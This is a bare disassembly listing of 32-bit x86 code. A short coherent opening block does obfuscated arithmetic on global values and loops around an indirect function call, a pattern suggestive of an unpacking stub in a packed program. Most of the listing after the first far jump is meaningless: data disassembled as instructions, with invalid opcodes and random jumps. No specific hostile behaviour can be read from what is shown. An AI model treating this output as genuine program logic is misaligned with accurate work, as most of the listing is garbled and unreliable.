  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a2c0
  40a251:	outs   dx,DWORD PTR ds:[esi]
  40a252:	and    DWORD PTR [eax-0x30],edi
  40a255:	add    eax,0x5f4e7c7c
  40a25a:	jl     0x40a2d8
  40a25c:	mov    esp,0xe6d5d364
  40a262:	add    edi,DWORD PTR [edx+0x46]
  40a265:	mov    edi,0x9910da2c
  40a26a:	push   eax
  40a26b:	out    0x1,eax
  40a26d:	fwait
  40a26e:	jno    0x40a1f7
  40a270:	mov    ch,0xed
  40a272:	xor    dh,BYTE PTR [esi+0x2b]
  40a275:	push   cs
  40a276:	cmp    DWORD PTR [ecx+0x13],esp
  40a279:	lods   al,BYTE PTR ds:[esi]
  40a27a:	pop    eax
  40a27b:	out    0x51,eax
  40a27d:	sub    dl,ch
  40a27f:	mov    bl,0xf5
  40a281:	ltr    WORD PTR [eax]
  40a284:	dec    ebp
  40a285:	ins    BYTE PTR es:[edi],dx
  40a286:	cwde   
  40a287:	inc    ebp
  40a288:	pop    esi
  40a289:	retf   0x59a7
  40a28c:	les    ebp,FWORD PTR [ebp-0x2b7a3d9]
  40a292:	or     cl,bl
  40a294:	pop    ds
  40a295:	jecxz  0x40a267
  40a297:	sbb    edi,DWORD PTR [edi+0x17]
  40a29a:	push   esi
  40a29b:	lahf   
  40a29c:	xor    eax,0x344606f2
  40a2a1:	fnstcw WORD PTR [ebx]
  40a2a3:	mov    cs,WORD PTR [ecx]
  40a2a5:	repz dec ebp
  40a2a7:	cmpxchg DWORD PTR [esi+0x31bbbb8e],edi
  40a2ae:	sbb    al,0xd5
  40a2b0:	ret    0xef6b
  40a2b3:	mov    bh,0xe1
  40a2b5:	mov    ecx,0x2827ff09
  40a2ba:	dec    esp
  40a2bb:	adc    al,0x2f
  40a2bd:	adc    bh,BYTE PTR [ebx]
  40a2bf:	std    
  40a2c0:	mov    ah,0x27
  40a2c2:	mov    edi,0xf8dc0284
  40a2c7:	xor    al,0xb5
  40a2c9:	add    dh,BYTE PTR [eax+0x1e65a8ed]
  40a2cf:	lahf   
  40a2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d1:	push   es
  40a2d2:	dec    edx
  40a2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2d4:	das    
  40a2d5:	mov    gs,WORD PTR [ebp-0x46]
  40a2d8:	or     ah,bh
  40a2da:	out    0x91,al
  40a2dc:	push   cs
  40a2dd:	or     DWORD PTR [edx-0x60],edi
  40a2e0:	arpl   WORD PTR [ebp-0x26046a44],sp
  40a2e6:	sub    DWORD PTR [edi+0x7fd33c22],ecx
  40a2ec:	lea    ebp,[ebp-0x72]
  40a2ef:	push   0x9
  40a2f1:	adc    DWORD PTR [edx+0x43],eax
  40a2f4:	fdivr  QWORD PTR [edx+0x1fbf4c3b]
  40a2fa:	and    esp,DWORD PTR [ebp+eax*8+0x3b66e437]
  40a301:	sbb    esi,ebp
  40a303:	adc    DWORD PTR [ebp+0x3e21dcb1],edx
  40a309:	inc    ebx
  40a30a:	stc    
  40a30b:	push   es
  40a30c:	push   0x7d
  40a30e:	gs (bad) 
  40a310:	adc    BYTE PTR [ecx-0x1d],ah
  40a313:	cmp    esp,ebx
  40a315:	inc    ebx
  40a316:	add    al,0x63
  40a318:	loopne 0x40a37e
  40a31a:	clc    
  40a31b:	mov    ch,0x19
  40a31d:	dec    ebp
  40a31e:	aam    0x5c
  40a320:	aas    
  40a321:	in     al,0x25
  40a323:	rcr    BYTE PTR [edx-0x430e078],cl
  40a329:	loope  0x40a2f0
  40a32b:	dec    edi
  40a32c:	fsubr  DWORD PTR [edx+eax*1-0x18]
  40a330:	push   ecx
  40a331:	jge    0x40a2c3
  40a333:	mov    WORD PTR ds:0x51623439,ds
  40a339:	daa    
  40a33a:	aaa    
  40a33b:	ins    BYTE PTR es:[edi],dx
  40a33c:	stos   DWORD PTR es:[edi],eax
  40a33d:	pushf  
  40a33e:	jge    0x40a38f
  40a340:	mov    esi,0xd66f244f
  40a345:	pop    edx
  40a346:	stc    
  40a347:	pushf  
  40a348:	mov    esp,0x2143503f
  40a34d:	sub    DWORD PTR [edi+ecx*4+0x3e851213],esp
  40a354:	ins    DWORD PTR es:[edi],dx
  40a355:	shr    DWORD PTR [ebx+esi*8+0x256755a7],1
  40a35c:	popa   
  40a35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a35e:	inc    edx
  40a35f:	dec    ecx
  40a360:	sbb    bl,ah
  40a362:	call   0xe4b0c84f
  40a367:	es test eax,0x4c138b69
  40a36d:	mov    bl,0x9f
  40a36f:	pop    ds
  40a370:	adc    edi,DWORD PTR [esi+eiz*4]
  40a373:	(bad)  
  40a374:	mov    edx,0x16805af6
  40a379:	jmp    0x40a311
  40a37b:	int3   
  40a37c:	dec    ecx
  40a37d:	imul   bl
  40a37f:	inc    eax
  40a380:	xchg   edi,eax
  40a381:	or     BYTE PTR [edx+eax*1],cl
  40a384:	adc    edi,ebp
  40a386:	inc    esi
  40a387:	out    dx,al
  40a388:	cmc    
  40a389:	or     BYTE PTR [edi-0x7d],0xc3
  40a38d:	mov    BYTE PTR [edx-0x21f9fa7],ah
  40a393:	xlat   BYTE PTR ds:[ebx]
  40a394:	sbb    eax,0xbd6e6801
  40a399:	and    eax,DWORD PTR [ecx]
  40a39b:	mov    eax,ds:0x63e6dbd2
  40a3a0:	inc    esi
  40a3a1:	push   ecx
  40a3a2:	ret    
  40a3a3:	or     dh,BYTE PTR [esi+0x203043b9]
  40a3a9:	sub    al,0x4c
  40a3ab:	(bad)  
  40a3ac:	mov    ecx,0x524229fc
  40a3b1:	or     al,0x57
  40a3b3:	(bad)  
  40a3b4:	cmp    ah,BYTE PTR [ebp+0x2a]
  40a3b7:	sub    edx,edi
  40a3b9:	mov    fs,WORD PTR ds:0xee69202d
  40a3bf:	or     DWORD PTR [ecx+0x1a],0xb7f0e2f5
  40a3c6:	adc    bl,BYTE PTR [edi]
  40a3c8:	iret   
  40a3c9:	mov    ebp,0x219ea714
  40a3ce:	mov    ah,0xb3
  40a3d0:	mov    eax,ds:0xe012649f
  40a3d5:	mov    ecx,0xa956747c
  40a3da:	ret    0x11dd
  40a3dd:	pop    edx
  40a3de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3df:	test   DWORD PTR [edx+edi*8],0x805ba825
  40a3e6:	cmp    al,0x8b
  40a3e8:	push   es
  40a3e9:	jmp    0xedce:0x43932574
  40a3f0:	cli    
  40a3f1:	call   0x1b154a76
  40a3f6:	fist   WORD PTR [ebx]
  40a3f8:	stc    
  40a3f9:	pop    es
  40a3fa:	xchg   esi,eax
  40a3fb:	jnp    0x40a3c2
  40a3fd:	jcxz   0x40a46e
  40a400:	cmp    al,BYTE PTR [ecx-0x1fe90de6]
  40a406:	rol    BYTE PTR [edx+eiz*4],0x12
  40a40a:	clc    
  40a40b:	test   eax,0xc1a48c2c
  40a410:	je     0x40a3c0
  40a412:	gs and al,0x96
  40a415:	or     dl,cl
  40a417:	loope  0x40a48b
  40a419:	es adc al,0x78
  40a41c:	inc    edi
  40a41d:	mov    eax,ds:0xa310bc32
  40a422:	scas   eax,DWORD PTR es:[edi]
  40a423:	sbb    eax,0xbeecf4f2
  40a428:	(bad)  
  40a42a:	int    0x16
  40a42c:	mov    WORD PTR [ecx],gs
  40a42e:	sbb    al,0xd
  40a430:	jge    0x40a3d8
  40a432:	cld    
  40a433:	or     BYTE PTR [eax-0x4e9f823a],0x46
  40a43a:	mov    ah,0xea
  40a43c:	nop
  40a43d:	pop    esi
  40a43e:	pop    ss
  40a43f:	stos   BYTE PTR es:[edi],al
  40a440:	push   esi
  40a441:	xchg   esp,eax
  40a442:	add    al,0xa
  40a444:	mov    bl,0x8b
  40a446:	inc    edx
  40a447:	stos   BYTE PTR es:[edi],al
  40a448:	fadd   DWORD PTR [edx-0x3c0bca6d]
  40a44e:	push   cs
  40a44f:	aaa    
  40a450:	jge    0x40a416
  40a452:	mov    cl,0xeb
  40a454:	jmp    0x4722:0xeb277718
  40a45b:	popf   
  40a45c:	leave  
  40a45d:	xchg   ecx,eax
  40a45e:	pop    ds
  40a45f:	push   ecx
  40a460:	xchg   ebx,eax
  40a461:	fimul  WORD PTR [eax]
  40a463:	xor    BYTE PTR [ebx],0x61
  40a466:	mov    dl,0x52
  40a468:	sbb    bl,BYTE PTR fs:[ebx-0x7a]
  40a46c:	setnp  BYTE PTR [edx]
  40a46f:	outs   dx,BYTE PTR ds:[esi]
  40a470:	mov    edx,0x66aa2416
  40a475:	jp     0x40a43f
  40a477:	sbb    BYTE PTR [ecx+0x5e],0xad
  40a47b:	adc    cl,0x97
  40a47e:	or     ch,ah
  40a480:	div    BYTE PTR [ebx-0x247fe723]
  40a486:	mov    cl,0x4d
  40a488:	mov    dl,0x49
  40a48a:	imul   edi,DWORD PTR [edx+0x56],0xffffffee
  40a48e:	and    al,0xa6
  40a490:	adc    DWORD PTR [ebx],edi
  40a492:	xchg   ebp,eax
  40a493:	sub    esi,DWORD PTR [edi-0x8a7d10a]
  40a499:	mov    ch,0xee
  40a49b:	jb     0x40a4ff
  40a49d:	ins    DWORD PTR es:[edi],dx
  40a49e:	mov    cs,WORD PTR [eax-0x62]
  40a4a1:	imul   edx,DWORD PTR [eax],0x1a037ba6
  40a4a7:	popf   
  40a4a8:	mov    ebx,DWORD PTR [edi]
  40a4aa:	call   edx
  40a4ac:	push   ecx
  40a4ad:	and    DWORD PTR [eax],eax
  40a4af:	mov    dh,BYTE PTR [ebp+0x0]
  40a4b2:	pop    esp
  40a4b3:	mov    ah,0xac
  40a4b5:	pop    esi
  40a4b6:	bound  ebx,QWORD PTR [edi+0x65403f2d]
  40a4bc:	shl    edx,1
  40a4be:	test   bh,ch
  40a4c0:	jl     0x40a466
  40a4c2:	pop    edi
  40a4c3:	in     eax,0x9c
  40a4c5:	test   DWORD PTR [eax+0x1d],0xd2fe0f4f
  40a4cc:	retf   0x49fc
  40a4cf:	arpl   cx,si
  40a4d1:	inc    esi
  40a4d2:	(bad)  
  40a4d3:	jnp    0x40a472
  40a4d5:	mov    ah,0xb4
  40a4d7:	pinsrw mm1,WORD PTR [esi-0x31],0x15
  40a4dc:	xor    BYTE PTR [ecx-0x52209a5e],ch
  40a4e2:	ror    BYTE PTR [ebp-0x5],0x1e
  40a4e6:	call   0xb081:0xd9d9d6e8
  40a4ed:	and    ah,cl
  40a4ef:	adc    BYTE PTR [ebx+ebx*4],ch
  40a4f2:	adc    BYTE PTR [ebx-0x4b],cl
  40a4f5:	add    BYTE PTR [ebp+0x17],bl
  40a4f8:	shr    DWORD PTR [eax+0x5d],1
  40a4fb:	xchg   edi,eax
  40a4fc:	push   cs
  40a4fd:	scas   al,BYTE PTR es:[edi]
  40a4fe:	xlat   BYTE PTR ds:[ebx]
  40a4ff:	add    al,0x96
  40a501:	add    DWORD PTR [esi+0x7a],eax
  40a504:	or     edx,DWORD PTR [esi+0x57]
  40a507:	out    dx,al
  40a508:	data16 outs dx,BYTE PTR ds:[esi]
  40a50a:	fcomi  st,st(5)
  40a50c:	idiv   ebp
  40a50e:	sbb    al,0x44
  40a510:	push   ecx
  40a511:	add    bl,BYTE PTR [ebp+0xdf160cf]
  40a517:	icebp  
  40a518:	ret    
  40a519:	pusha  
  40a51a:	imul   ebp,DWORD PTR [edx],0xfffffff8
  40a51d:	xchg   edi,eax
  40a51e:	pusha  
  40a51f:	cmp    edi,eax
  40a521:	xor    ebx,DWORD PTR [ebx-0x4c05af72]
  40a527:	out    dx,al
  40a528:	sbb    ah,BYTE PTR [ebp+0x19f3a8b3]
  40a52e:	leave  
  40a52f:	retf   
  40a530:	push   esp
  40a531:	fldenv ds:0xb1c275ba
  40a537:	push   edx
  40a538:	stos   DWORD PTR es:[edi],eax
  40a539:	pop    edx
  40a53a:	pop    edi
  40a53b:	push   0x9480363d
  40a540:	inc    edi
  40a541:	in     al,dx
  40a542:	into   
  40a543:	sahf   
  40a544:	mov    bh,0xbb
  40a546:	jo     0x40a518
  40a548:	push   es
  40a549:	ds inc esi
  40a54b:	icebp  
  40a54c:	retf   0x242d
  40a54f:	add    BYTE PTR [esi+0x3d],cl
  40a552:	test   BYTE PTR [ebx-0x16f0c39d],bl
  40a558:	cmp    DWORD PTR [eax+edx*2],eax
  40a55b:	imul   esp,DWORD PTR [esi-0x40],0xe6e610e1
  40a562:	shl    bl,0xb2
  40a565:	jle    0x40a5bb
  40a567:	xor    BYTE PTR [esi-0x1f],bl
  40a56a:	mul    DWORD PTR [ecx-0x49268d8a]
  40a570:	push   ecx
  40a571:	inc    ebx
  40a572:	push   ebx
  40a573:	lahf   
  40a574:	loop   0x40a5b2
  40a576:	ret    
  40a577:	fdivr  st(2),st
  40a579:	push   ecx
  40a57a:	or     ebp,DWORD PTR [edx]
  40a57c:	mov    ecx,0xb3ab9d91
  40a581:	mov    dh,0x3e
  40a583:	aad    0xbb
  40a585:	rcr    BYTE PTR [esi+0x2199fc6c],0xcd
  40a58c:	(bad)  
  40a58d:	jg     0x40a60c
  40a58f:	mov    cl,BYTE PTR [esi]
  40a591:	retf   0xbfca
  40a594:	cmp    eax,0x18250d4c
  40a599:	add    edi,edx
  40a59b:	jae    0x40a5ad
  40a59d:	mov    ds,WORD PTR [ebx-0x15ed3bbd]
  40a5a3:	ins    BYTE PTR es:[edi],dx
  40a5a4:	dec    esp
  40a5a5:	push   ds
  40a5a6:	cmp    al,0xd7
  40a5a8:	add    al,0xf2
  40a5aa:	(bad)  
  40a5ab:	jl     0x40a5eb
  40a5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ae:	sbb    eax,0xfdd37fc
  40a5b3:	push   ss
  40a5b4:	aaa    
  40a5b5:	shrd   DWORD PTR [ecx],edx,cl
  40a5b8:	xchg   ecx,eax
  40a5b9:	loop   0x40a568
  40a5bb:	sti    
  40a5bc:	mov    cl,0x5a
  40a5be:	adc    ecx,edi
  40a5c0:	mov    dh,0x46
  40a5c2:	mov    bl,0xa0
  40a5c4:	pop    edi
  40a5c5:	sub    ebx,DWORD PTR [esi+0x23]
  40a5c8:	jnp    0x40a560
  40a5ca:	ss sub eax,0xa00da2e6
  40a5d0:	add    DWORD PTR [ebx-0x6],0x17cd4770
  40a5d7:	in     eax,dx
  40a5d8:	pop    ebp
  40a5d9:	jnp    0x40a5da
  40a5db:	adc    edi,DWORD PTR [eax-0x66]
  40a5de:	mov    ah,0xfd
  40a5e0:	adc    BYTE PTR [ecx-0x4d1601af],cl
  40a5e6:	lock sub ch,BYTE PTR [esi+0x43]
  40a5ea:	call   0x441b4d9c
  40a5ef:	in     eax,dx
  40a5f0:	sbb    edi,ebx
  40a5f2:	fsub   DWORD PTR [ebp-0x43dbb7bf]
  40a5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5f9:	sub    ebp,DWORD PTR [ebx+0x397f5e2a]
  40a5ff:	fidivr DWORD PTR [ecx-0x10]
  40a602:	ficomp DWORD PTR [ebp-0x226345a7]
  40a608:	sahf   
  40a609:	int    0xb7
  40a60b:	rcl    ah,cl
  40a60d:	jp     0x40a652
  40a60f:	push   eax
  40a611:	nop
  40a612:	je     0x40a686
  40a614:	aad    0x8c
  40a616:	cmp    al,0x9b
  40a618:	mov    eax,ds:0x26ef1c20
  40a61d:	fsubr  st(1),st
  40a61f:	(bad)  
  40a620:	fwait
  40a621:	(bad)  
  40a622:	mov    ds:0x39e8d4d2,al
  40a627:	ins    DWORD PTR es:[edi],dx
  40a628:	add    BYTE PTR [edi+ebx*2],al
  40a62b:	xchg   ebp,eax
  40a62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a62d:	mov    eax,0x51e06a86
  40a632:	pop    ss
  40a633:	mov    eax,ds:0x36a9877f
  40a638:	xlat   BYTE PTR ds:[ebx]
  40a639:	arpl   WORD PTR [eax],dx
  40a63b:	jno    0x40a660
  40a63d:	add    DWORD PTR [edx-0x4b],ebx
  40a640:	sti    
  40a641:	(bad)  
  40a642:	in     al,dx
  40a643:	in     eax,dx
  40a644:	pop    ecx
  40a645:	add    eax,DWORD PTR [ebx+eiz*1+0x39]
  40a649:	pop    edx
  40a64a:	ins    BYTE PTR es:[edi],dx
  40a64b:	push   es
  40a64c:	mov    ebp,0xd123e9f7
  40a651:	(bad)  
  40a652:	ins    BYTE PTR es:[edi],dx
  40a653:	adc    ch,BYTE PTR [eax]
  40a655:	in     eax,dx
  40a656:	clc    
  40a657:	popf   
  40a658:	cmp    BYTE PTR [ebx],bl
  40a65a:	inc    edi
  40a65b:	jbe    0x40a6d1
  40a65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65e:	and    edx,DWORD PTR [eax+0x7ba76be4]
  40a664:	ins    BYTE PTR es:[edi],dx
  40a665:	cdq    
  40a666:	inc    edx
  40a667:	push   esi
  40a668:	adc    edi,ebx
  40a66a:	add    bh,BYTE PTR [ebx+eax*2+0x83e3cb1]
  40a671:	test   al,0x84
  40a673:	dec    esp
  40a674:	push   edi
  40a675:	fmulp  st(6),st
  40a677:	xor    DWORD PTR [edi],ebx
  40a679:	sbb    al,BYTE PTR [edi+0x45]
  40a67c:	pop    edx
  40a67d:	(bad)  
  40a67e:	pop    edi
  40a67f:	repnz push esi
  40a681:	mov    cl,0xdc
  40a683:	(bad)  
  40a684:	ds out 0x25,al
  40a687:	mov    dl,0x15
  40a689:	loop   0x40a63d
  40a68b:	pop    edx
  40a68c:	add    BYTE PTR [edi-0x261e2c04],bh
  40a692:	sub    dh,BYTE PTR [ebp-0x1a]
  40a695:	xchg   ebp,eax
  40a696:	mov    bl,dl
  40a698:	mov    BYTE PTR [edx],ch
  40a69a:	sub    dl,BYTE PTR [ebp+0x5233834d]
  40a6a0:	xchg   ebp,eax
  40a6a1:	stos   BYTE PTR es:[edi],al
  40a6a2:	sub    DWORD PTR [eax+0x65e56447],esp
  40a6a8:	pop    DWORD PTR [edx+0x4f]
  40a6ab:	bound  esp,QWORD PTR [ebx-0x72]
  40a6ae:	sbb    al,0x8c
  40a6b0:	leave  
  40a6b1:	jp     0x40a686
  40a6b3:	mov    ecx,0xfea0a52d
  40a6b8:	mov    ebx,0xe4f4eaea
  40a6bd:	lahf   
  40a6be:	pop    edx
  40a6bf:	cmp    eax,0xb7ecbfff
  40a6c4:	call   0xcdcb:0x659a1ebf
  40a6cb:	xchg   ecx,eax
  40a6cc:	pop    eax
  40a6cd:	cmc    
  40a6ce:	mov    eax,ds:0x64f14850
  40a6d3:	push   0xeac8d2cc
  40a6d8:	gs daa 
  40a6da:	rcl    DWORD PTR [ebx+0x2ff749b9],0xec
  40a6e1:	jae    0x40a710
  40a6e3:	scas   eax,DWORD PTR es:[edi]
  40a6e4:	push   es
  40a6e5:	xchg   DWORD PTR [ecx+0x69603adc],esp
  40a6eb:	pop    ebx
  40a6ec:	dec    ebx
  40a6ed:	adc    dh,ah
  40a6ef:	or     BYTE PTR [eax],bl
  40a6f1:	leave  
  40a6f2:	xchg   esp,eax
  40a6f3:	xchg   ebx,eax
  40a6f4:	jnp    0x40a703
  40a6f6:	push   0x733efbf2
  40a6fb:	fimul  WORD PTR [ebx]
  40a6fd:	xlat   BYTE PTR ds:[ebx]
  40a6fe:	dec    eax
  40a6ff:	xchg   edi,eax
  40a700:	cmp    BYTE PTR [edx-0x5af870ef],bl
  40a706:	enter  0x4b7e,0x9d
  40a70a:	sub    BYTE PTR [eax],cl
  40a70c:	cmp    eax,0x7aba4a6b
  40a711:	(bad)  
  40a712:	cmc    
  40a713:	push   edi
  40a714:	jbe    0x40a6ca
  40a716:	adc    ch,ah
  40a718:	loop   0x40a78d
  40a71a:	fst    DWORD PTR [eax-0x45]
  40a71d:	jae    0x40a786
  40a71f:	test   eax,0xbcd2a903
  40a724:	shl    BYTE PTR [esi+0x1438151c],0xc2
  40a72b:	inc    esp
  40a72c:	call   0xf40a:0x2a87f6a7
  40a733:	jp     0x40a6e7
  40a735:	adc    al,0x34
  40a737:	loopne 0x40a6d2
  40a739:	fbld   TBYTE PTR [ebx+ebx*2+0x23]
  40a73d:	sbb    al,BYTE PTR [edx+edx*8]
  40a740:	fistp  WORD PTR [esi+0x9]
  40a743:	test   DWORD PTR [edi],edx
  40a745:	jne    0x40a725
  40a747:	outs   dx,DWORD PTR ds:[esi]
  40a748:	or     eax,0xa174a584
  40a74d:	sbb    ebx,ecx
  40a74f:	shr    BYTE PTR [ebx+0x4e],0xe7
  40a753:	push   0xffffffc0
  40a755:	inc    edi
  40a756:	push   esi
  40a757:	int    0x1f
  40a759:	pop    esi
  40a75a:	out    dx,al
  40a75b:	jno    0x40a770
  40a75d:	ins    BYTE PTR es:[edi],dx
  40a75e:	std    
  40a75f:	jmp    0x9cff:0xcdd9d91d
  40a766:	mov    ebx,0xdaf429c3
  40a76b:	adc    bh,BYTE PTR [edi+0x55d5f601]
  40a771:	or     cl,ah
  40a773:	mov    dl,0x5c
  40a775:	les    ebp,FWORD PTR [ebx+0x3223a1d]
  40a77b:	aas    
  40a77c:	pop    ecx
  40a77d:	stos   BYTE PTR es:[edi],al
  40a77e:	mov    ebp,0x71dba47e
  40a783:	jnp    0x40a759
  40a785:	jmp    0xce03:0x925e6c6c
  40a78c:	jecxz  0x40a78e
  40a78e:	sahf   
  40a78f:	iret   
  40a790:	int    0x8e
  40a792:	test   DWORD PTR [esi],esi
  40a794:	icebp  
  40a795:	dec    ebp
  40a796:	fisttp DWORD PTR [esi+0x35]
  40a799:	mov    cl,0xe2
  40a79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a79c:	ret    
  40a79d:	test   al,0xf0
  40a79f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a0:	ds rcr bl,0xee
  40a7a4:	out    dx,eax
  40a7a5:	(bad)  
  40a7a6:	std    
  40a7a7:	sar    ch,0xc6
  40a7aa:	sub    BYTE PTR [edi+0x7b],0x6a
  40a7ae:	ret    0xf805
  40a7b1:	ret    0x17f4
  40a7b4:	push   ss
  40a7b5:	xchg   ecx,eax
  40a7b6:	ror    DWORD PTR [edi+0x32],1
  40a7b9:	and    al,0x22
  40a7bb:	out    dx,eax
  40a7bc:	sub    BYTE PTR [ebx-0x5b55cbc5],0x9d
  40a7c3:	cmp    eax,0x3cc73628
  40a7c8:	int3   
  40a7c9:	jmp    0x9fd5:0xc14f358c
  40a7d0:	imul   eax,DWORD PTR [esi-0x6438bca5],0xffffff86
  40a7d7:	and    cl,BYTE PTR [edx+0x35e4adc5]
  40a7dd:	loop   0x40a80b
  40a7df:	sbb    bl,BYTE PTR [ecx+0x1f]
  40a7e2:	pop    ds
  40a7e3:	cmp    edx,DWORD PTR [eax+0x16]
  40a7e6:	xchg   cl,al
  40a7e8:	cmp    al,0x1f
  40a7ea:	mov    al,ds:0x85bc9f7f
  40a7ef:	push   edi
  40a7f0:	dec    ebx
  40a7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f2:	jp     0x40a77f
  40a7f4:	gs lahf 
  40a7f6:	cmp    DWORD PTR [edi],edx
  40a7f8:	popf   
  40a7f9:	(bad)  
  40a7fb:	loopne 0x40a862
  40a7fd:	(bad)  
  40a7fe:	mov    DWORD PTR [eax+0x13],esi
  40a801:	mov    DWORD PTR [edx],ecx
  40a803:	dec    DWORD PTR ds:0xf9fea0b4
  40a809:	imul   ebx,DWORD PTR [esp+edx*1-0x27],0x3c4c3d75
  40a811:	hlt    
  40a812:	sub    al,0x76
  40a814:	mov    eax,ds:0x5478cbcf
  40a819:	dec    ecx
  40a81a:	cmp    bl,BYTE PTR [ebx-0x60]
  40a81d:	inc    esp
  40a81e:	push   eax
  40a81f:	dec    esp
  40a820:	es pusha 
  40a822:	jns    0x40a7a7
  40a824:	jo     0x40a84c
  40a826:	push   0xdbefff33
  40a82b:	mov    dl,BYTE PTR [edx-0x60a15c15]
  40a831:	mov    BYTE PTR [ebx+0xd],dl
  40a834:	data16 (bad) 
  40a836:	xchg   esi,eax
  40a837:	enter  0xa61a,0xf4
  40a83b:	lahf   
  40a83c:	or     al,dl
  40a83e:	mov    ebp,0xf1852452
  40a843:	rep outs dx,BYTE PTR ds:[esi]
  40a845:	xor    DWORD PTR [ebx+0x7223a03c],esi
  40a84b:	daa    
  40a84c:	or     edx,ecx
  40a84e:	fs sti 
  40a850:	push   cs
  40a851:	fcomp  DWORD PTR [ecx]
  40a853:	and    al,0xe2
  40a855:	and    eax,0xfc7676ae
  40a85a:	cdq    
  40a85b:	xor    esp,ebp
  40a85d:	sbb    al,0x78
  40a85f:	jge    0x40a88b
  40a861:	test   eax,0x9b5348bf
  40a866:	mov    ?,WORD PTR [ecx]
  40a868:	aad    0xc
  40a86a:	sbb    al,0x6e
  40a86c:	jmp    0xdad:0x6c2f2fa5
  40a873:	mul    BYTE PTR [edx]
  40a875:	lea    ebx,[ecx+edi*8-0xb8df30d]
  40a87c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a87d:	cmp    eax,0xa44700de
  40a882:	push   esi
  40a883:	out    dx,eax
  40a884:	mov    esp,DWORD PTR [ebx]
  40a886:	xchg   ebp,eax
  40a887:	in     eax,0x85
  40a889:	sahf   
  40a88a:	paddq  mm4,QWORD PTR [edx-0x68]
  40a88e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a88f:	pushf  
  40a890:	mov    dh,0xef
  40a892:	(bad)  
  40a893:	fstp   QWORD PTR [eax+0x267b0489]
  40a899:	lock pop ecx
  40a89b:	in     al,dx
  40a89c:	(bad)  
  40a89d:	in     al,dx
  40a89e:	dec    edi
  40a89f:	(bad)  
  40a8a0:	push   0xffffffc0
  40a8a2:	mov    esp,0x22d2132e
  40a8a7:	push   0x36
  40a8a9:	shr    esp,0xb4
  40a8ac:	sbb    al,0xc7
  40a8ae:	test   al,0xc3
  40a8b0:	(bad)
  40a8b6:	test   eax,0xafe910a4
  40a8bb:	inc    ecx
  40a8bc:	and    ch,BYTE PTR [edx+0x7e]
  40a8bf:	js     0x40a8d4
  40a8c1:	add    eax,0x8345ee30
  40a8c6:	stos   BYTE PTR es:[edi],al
  40a8c7:	mov    dl,al
  40a8c9:	cmp    esi,DWORD PTR [edi]
  40a8cb:	and    BYTE PTR [eax-0x27cdb839],al
  40a8d1:	ffree  st(0)
  40a8d3:	pop    esi
  40a8d4:	aad    0xbd
  40a8d6:	cmp    dl,BYTE PTR [ebp+0x7afcb507]
  40a8dc:	mov    dh,0x71
  40a8de:	lahf   
  40a8df:	jns    0x40a954
  40a8e1:	jns    0x40a932
  40a8e3:	add    ah,BYTE PTR ds:0x2752f844
  40a8e9:	aad    0x32
  40a8eb:	daa    
  40a8ec:	sub    DWORD PTR [ebx-0x36],0xbbb100eb
  40a8f3:	sub    BYTE PTR [ebx+esi*1-0x68],bl
  40a8f7:	sbb    DWORD PTR [esi],ebx
  40a8f9:	xor    ah,bh
  40a8fb:	hlt    
  40a8fc:	jmp    0xac8f:0xc8727207
  40a903:	push   cs
  40a904:	inc    esp
  40a905:	gs mov esi,0xc1569d3f
  40a90b:	fbld   TBYTE PTR [ecx+0x1c2048d6]
  40a911:	sar    edx,cl
  40a913:	fs popa 
  40a915:	out    dx,al
  40a916:	rcl    BYTE PTR [ebx+0x3a982b11],0x3d
  40a91d:	and    ecx,DWORD PTR [eax+eiz*1]
  40a920:	int    0xd6
  40a922:	jo     0x40a8fd
  40a924:	in     al,dx
  40a925:	pop    ds
  40a926:	pop    eax
